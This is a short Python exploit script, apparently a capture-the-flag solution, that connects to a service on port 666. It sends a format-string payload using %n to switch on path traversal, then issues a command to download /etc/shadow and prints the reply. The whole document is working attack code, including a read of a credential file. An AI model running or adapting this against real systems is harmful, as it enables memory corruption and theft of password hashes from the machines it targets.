import socket


def send_cmd(payload, recv_after=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0', 666))
    for a in payload.split('\n'):
        s.send(a.encode())

    if recv_after:
        d = s.recv(1024)
        while d:
            print(d.decode())
            d = s.recv(1024)
    else:
        s.close()

if __name__ == '__main__':
    enable_path_traversal = "%lu%lu%lu%lu%lu%216x%n"
    get_passwd_file = "NEF_DOWNLOAD /etc/shadow"


    send_cmd(enable_path_traversal)
    send_cmd(get_passwd_file)
